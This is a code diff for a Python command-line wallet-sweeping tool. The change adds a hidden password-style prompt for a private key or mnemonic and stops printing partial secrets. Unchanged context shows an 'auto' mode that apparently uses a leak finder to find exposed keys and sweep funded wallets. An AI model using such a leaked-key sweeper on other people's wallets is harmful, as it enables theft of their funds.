@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import asyncio
+import getpass
 import json
 import os
 
@@ -153,30 +154,18 @@ def sweep(
 
         try:
             if mnemonic:
-                typer.echo(f"Sweeping mnemonic: {mnemonic[:20]}...")
-                try:
-                    derived = derive_from_mnemonic(mnemonic)
-                except ValueError as exc:
-                    typer.echo(f"Error: {exc}", err=True)
-                    raise typer.Exit(1)
-                results = await _sweep_derived(derived, chain, dry_run)
-                typer.echo(json.dumps(results, indent=2, default=str))
+                typer.echo("Sweeping mnemonic...", err=True)
+                derived = derive_from_mnemonic(mnemonic)
             elif key:
-                typer.echo(f"Sweeping key: {key[:10]}...")
-                try:
-                    input_type = detect_input_type(key)
-                    if input_type == "mnemonic":
-                        derived = derive_from_mnemonic(key)
-                    elif input_type == "private_key":
-                        derived = [derive_from_privatekey(key)]
-                    else:
-                        typer.echo("Error: Input is not a private key or mnemonic", err=True)
-                        raise typer.Exit(1)
-                except ValueError as exc:
-                    typer.echo(f"Error: {exc}", err=True)
+                typer.echo("Sweeping key...", err=True)
+                input_type = detect_input_type(key)
+                if input_type == "mnemonic":
+                    derived = derive_from_mnemonic(key)
+                elif input_type == "private_key":
+                    derived = [derive_from_privatekey(key)]
+                else:
+                    typer.echo("Error: Input is not a private key or mnemonic", err=True)
                     raise typer.Exit(1)
-                results = await _sweep_derived(derived, chain, dry_run)
-                typer.echo(json.dumps(results, indent=2, default=str))
             elif auto:
                 typer.echo("Auto-sweep: scanning for funded wallets...")
                 # Use leak finder to find keys, then sweep
@@ -193,9 +182,25 @@ def sweep(
                 if result.sweep_results:
                     for sr in result.sweep_results:
                         typer.echo(f"  Swept: {sr}")
+                return
             else:
-                typer.echo("Specify --key, --mnemonic, or --auto", err=True)
-                raise typer.Exit(1)
+                secret = getpass.getpass("Enter private key or mnemonic (input hidden): ")
+                if not secret.strip():
+                    typer.echo("Error: No key or mnemonic provided", err=True)
+                    raise typer.Exit(1)
+                input_type = detect_input_type(secret)
+                if input_type == "mnemonic":
+                    derived = derive_from_mnemonic(secret)
+                elif input_type == "private_key":
+                    derived = [derive_from_privatekey(secret)]
+                else:
+                    typer.echo("Error: Input is not a private key or mnemonic", err=True)
+                    raise typer.Exit(1)
+            results = await _sweep_derived(derived, chain, dry_run)
+            typer.echo(json.dumps(results, indent=2, default=str))
+        except ValueError as exc:
+            typer.echo(f"Error: {exc}", err=True)
+            raise typer.Exit(1)
         finally:
             await sweeper.close()
 
